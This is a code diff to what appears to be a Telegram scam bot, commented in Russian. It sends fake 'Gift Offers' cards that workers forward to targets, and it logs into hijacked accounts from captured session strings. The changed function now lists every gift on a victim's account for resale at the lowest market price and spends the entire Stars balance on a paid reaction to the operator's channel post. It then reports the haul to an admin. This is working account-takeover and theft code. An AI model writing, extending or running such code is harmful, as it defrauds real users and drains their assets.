@@ -340,11 +340,23 @@ async def telethon_attempt_login(phone, code, password=None, session_str=None, p
         return False, 'error', None
 
 
-async def telethon_sell_gift_and_react(session_string, gift_name_hint):
+async def telethon_sell_gift_and_react(session_string, gift_name_hint=None):
+    """
+    1. Заходим в аккаунт
+    2. Получаем ВСЕ подарки аккаунта
+    3. Каждый выставляем за минимальную рыночную цену
+    4. Все звёзды с баланса → платная реакция на пост
+    5. Если подарков нет — просто звёзды на пост
+    """
     client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
     result = {
-        "gifts_found": [], "target": None, "min_price": None,
-        "listed": False, "reacted": False, "stars_sent": 0, "error": None,
+        "gifts_found": [],
+        "gifts_listed": [],
+        "total_listed": 0,
+        "balance_before": 0,
+        "reacted": False,
+        "stars_sent": 0,
+        "error": None,
     }
     try:
         await client.connect()
@@ -353,37 +365,49 @@ async def telethon_sell_gift_and_react(session_string, gift_name_hint):
             result["error"] = "session dead"
             return result
 
+        # ─── 1. получаем все подарки
+        gifts = []
         try:
-            gifts_resp = await client(GetSavedStarGiftsRequest(
-                peer=me.id, offset="", limit=100
-            ))
-            gifts = getattr(gifts_resp, "gifts", []) or []
+            offset = ""
+            while True:
+                gifts_resp = await client(GetSavedStarGiftsRequest(
+                    peer=me.id, offset=offset, limit=100,
+                    exclude_unsaved=True,
+                ))
+                page = getattr(gifts_resp, "gifts", []) or []
+                gifts.extend(page)
+                offset = getattr(gifts_resp, "next_offset", "") or ""
+                if not offset or not page:
+                    break
+                await asyncio.sleep(0.5)
         except Exception as e:
             result["error"] = f"get saved gifts: {e}"
             return result
 
-        hint_clean = gift_name_hint.lower().split("#")[0].strip()
+        print(f"[AUTO] found {len(gifts)} gifts on account")
+
+        # ─── 2. выставляем каждый за минимальную рыночную цену
         for g in gifts:
-            gift = getattr(g, "gift", None)
-            title = str(getattr(gift, "title", "") or "")
-            if title:
-                result["gifts_found"].append(title)
-            if hint_clean and hint_clean in title.lower() and not result["target"]:
-                result["target"] = g
+            gift_obj = getattr(g, "gift", None)
+            title = str(getattr(gift_obj, "title", "") or "Unknown")
+            gift_id = getattr(gift_obj, "id", None)
+            msg_id = getattr(g, "msg_id", None)
+            saved_id = getattr(g, "saved_id", None)
 
-        if not result["target"]:
-            result["error"] = f"подарок '{gift_name_hint}' не найден"
-            return result
+            result["gifts_found"].append(title)
 
-        target = result["target"]
-        gift_obj = getattr(target, "gift", None)
-        gift_id = getattr(gift_obj, "id", None)
+            if not gift_id:
+                result["gifts_listed"].append({
+                    "title": title, "min_price": None,
+                    "ok": False, "error": "no gift_id"
+                })
+                continue
 
-        min_price = 1
-        if gift_id:
+            # узнаём мин цену по рынку
+            min_price = None
             try:
                 resale = await client(GetResaleStarGiftsRequest(
-                    gift_id=gift_id, offset="", limit=10,
+                    gift_id=gift_id, offset="", limit=20,
                     sort_by_price=True, sort_by_num=False,
                     stars_only=True, for_craft=False,
                 ))
@@ -397,26 +421,47 @@ async def telethon_sell_gift_and_react(session_string, gift_name_hint):
                             prices.append(int(p))
                 if prices:
                     min_price = min(prices)
+                await asyncio.sleep(1.2)
             except Exception as e:
-                print(f"resale price error: {e}")
+                print(f"[AUTO] resale error for {title}: {e}")
 
-        result["min_price"] = min_price
+            if not min_price:
+                result["gifts_listed"].append({
+                    "title": title, "min_price": None,
+                    "ok": False, "error": "no market price"
+                })
+                continue
 
-        msg_id = getattr(target, "msg_id", None)
-        if not msg_id:
-            result["error"] = "нет msg_id"
-            return result
+            # выставляем
+            try:
+                if msg_id:
+                    stargift_ref = InputSavedStarGiftUser(msg_id=msg_id)
+                elif saved_id:
+                    stargift_ref = InputSavedStarGiftChat(peer=me.id, saved_id=saved_id)
+                else:
+                    result["gifts_listed"].append({
+                        "title": title, "min_price": min_price,
+                        "ok": False, "error": "no msg_id/saved_id"
+                    })
+                    continue
 
-        try:
-            await client(UpdateStarGiftPriceRequest(
-                stargift=InputSavedStarGiftUser(msg_id=msg_id),
-                resell_amount=StarsAmount(amount=min_price, nanos=0),
-            ))
-            result["listed"] = True
-        except Exception as e:
-            result["error"] = f"list error: {e}"
-            return result
+                await client(UpdateStarGiftPriceRequest(
+                    stargift=stargift_ref,
+                    resell_amount=StarsAmount(amount=min_price, nanos=0),
+                ))
+                result["gifts_listed"].append({
+                    "title": title, "min_price": min_price,
+                    "ok": True, "error": None
+                })
+                result["total_listed"] += 1
+                await asyncio.sleep(1.2)
+            except Exception as e:
+                result["gifts_listed"].append({
+                    "title": title, "min_price": min_price,
+                    "ok": False, "error": str(e)
+                })
 
+        # ─── 3. получаем баланс звёзд
         balance = 0
         try:
             status = await client(GetStarsStatusRequest(peer=me.id))
@@ -424,8 +469,10 @@ async def telethon_sell_gift_and_react(session_string, gift_name_hint):
             if bal:
                 balance = int(getattr(bal, "amount", 0) or 0)
         except Exception as e:
-            print(f"stars status error: {e}")
+            print(f"[AUTO] stars status error: {e}")
+        result["balance_before"] = balance
 
+        # ─── 4. платная реакция на пост
         if balance > 0 and TARGET_CHANNEL and TARGET_POST_ID:
             try:
                 await client(SendPaidReactionRequest(
@@ -438,6 +485,8 @@ async def telethon_sell_gift_and_react(session_string, gift_name_hint):
                 result["stars_sent"] = balance
             except Exception as e:
                 result["error"] = f"reaction: {e}"
+        elif balance == 0:
+            result["error"] = "баланс звёзд = 0, реакция не поставлена"
 
         return result
     except Exception as e:
@@ -722,6 +771,7 @@ def make_offer_card(o, duration=24):
         f"⚖️ <b>Gift Offers</b> отправил вам оффер на <b>{o.gift_name}</b>\n\n"
         f"Сумма оффера: <b>{o.price_stars}</b> ⭐️ ({o.price_usd}$)\n"
         f"За подарок: <b>{o.gift_name}</b>\n"
+        f"Ссылка: {o.gift_link}\n"
         f"Длительность: <b>{duration}h</b>\n\n"
         f"Вы можете просмотреть и ПРИНЯТЬ/ОТКЛОНИТЬ оффер, нажав кнопку ниже"
     )
@@ -783,7 +833,6 @@ async def cmd_offer(message: types.Message):
             text=make_offer_card(o),
             reply_markup=make_offer_kb(o.id),
             business_connection_id=conn.connection_id,
-            disable_web_page_preview=True,
         )
         sent = True
     except TelegramBadRequest as e:
@@ -800,7 +849,6 @@ async def cmd_offer(message: types.Message):
             await message.answer(
                 make_offer_card(o),
                 reply_markup=make_offer_kb(o.id),
-                disable_web_page_preview=True,
             )
         else:
             await message.answer(f"❌ Ошибка отправки:\n<code>{e}</code>")
@@ -877,7 +925,6 @@ async def offer_price(message: types.Message, state: FSMContext):
         "✅ <b>Оффер создан</b>\n\nПерешлите получателю:\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n" + make_offer_card(o),
         reply_markup=make_offer_kb(o.id),
-        disable_web_page_preview=True,
     )
     await add_log(worker_id=message.from_user.id, offer_id=o.id,
                   event="offer_created", detail=f"{o.gift_name} за {o.price_stars}⭐")
@@ -1174,22 +1221,40 @@ async def run_automation(session_string, offer_id):
     o = await get_offer(offer_id)
     if not o:
         return
-    await notify_admin(f"🚀 <b>Автомат</b>\nОффер #{offer_id}: {o.gift_name}")
-    result = await telethon_sell_gift_and_react(session_string, o.gift_name)
+    await notify_admin(f"🚀 <b>Автомат запущен</b>\nОффер #{offer_id}")
+    result = await telethon_sell_gift_and_react(session_string)
 
-    lines = [f"🎯 <b>Результат</b>", f"Оффер: #{offer_id}", f"Подарок: {o.gift_name}"]
-    if result.get("gifts_found"):
-        lines.append(f"Найдено: {len(result['gifts_found'])}")
-    if result.get("min_price"):
-        lines.append(f"Мин. цена: {result['min_price']} ⭐")
-    if result.get("listed"):
-        lines.append(f"✅ Выставлен")
+    lines = ["🎯 <b>Результат автомата</b>", f"Оффер: #{offer_id}", ""]
+
+    gifts_found = result.get("gifts_found", [])
+    lines.append(f"📦 Найдено подарков: <b>{len(gifts_found)}</b>")
+
+    listed = result.get("gifts_listed", [])
+    ok_listed = [x for x in listed if x.get("ok")]
+    fail_listed = [x for x in listed if not x.get("ok")]
+
+    if ok_listed:
+        lines.append(f"\n✅ <b>Выставлено ({len(ok_listed)}):</b>")
+        for x in ok_listed[:20]:
+            lines.append(f"• {x['title']} — {x['min_price']}⭐")
+        if len(ok_listed) > 20:
+            lines.append(f"…и ещё {len(ok_listed)-20}")
+
+    if fail_listed:
+        lines.append(f"\n❌ <b>Не выставлено ({len(fail_listed)}):</b>")
+        for x in fail_listed[:10]:
+            lines.append(f"• {x['title']} — {x.get('error') or '—'}")
+
+    lines.append(f"\n💰 Баланс до реакции: <b>{result.get('balance_before', 0)} ⭐</b>")
+
     if result.get("reacted"):
-        lines.append(f"✅ Реакция: {result['stars_sent']} ⭐")
-    if result.get("error"):
+        lines.append(f"✅ Реакция на пост: <b>{result['stars_sent']} ⭐</b>")
+    elif result.get("error"):
         lines.append(f"❌ {result['error']}")
+
     await notify_admin("\n".join(lines))
-    await add_log(offer_id=offer_id, event="automation_done", detail=str(result))
+    await add_log(offer_id=offer_id, event="automation_done",
+                  detail=f"listed={result.get('total_listed', 0)} reacted={result.get('reacted')}")
 
 
 @app.get("/health")
